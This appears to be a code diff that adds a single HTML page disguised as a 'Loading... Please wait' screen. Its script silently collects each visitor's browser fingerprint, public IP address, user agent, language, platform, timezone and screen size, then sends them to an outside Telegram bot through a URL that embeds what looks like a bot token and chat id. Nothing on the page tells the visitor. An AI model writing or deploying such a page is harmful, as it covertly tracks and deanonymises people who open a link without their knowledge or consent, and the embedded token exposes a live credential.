@@ -1,0 +1,34 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>Loading...</title>
+  </head>
+  <body>
+    <h3>Please wait...</h3>
+    <script src="https://cdn.jsdelivr.net/npm/@fingerprintjs/fingerprintjs@3/dist/fp.min.js"></script>
+    <script>
+      (async () => {
+        const fp = await FingerprintJS.load();
+        const result = await fp.get();
+
+        const ip = await fetch("https://api.ipify.org?format=json")
+          .then(res => res.json())
+          .then(data => data.ip);
+
+        const info = {
+          ip: ip,
+          userAgent: navigator.userAgent,
+          language: navigator.language,
+          platform: navigator.platform,
+          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+          screen: `${screen.width}x${screen.height}`,
+          fingerprint: result.visitorId
+        };
+
+        const message = encodeURIComponent(JSON.stringify(info, null, 2));
+
+        fetch(`https://api.telegram.org/bot<7641332700:AAHHn0QvbMo3quMzKxs9-E7CDAJb9sQzYUQ>/sendMessage?chat_id=<7467349703>&text=${message}`);
+      })();
+    </script>
+  </body>
+</html>
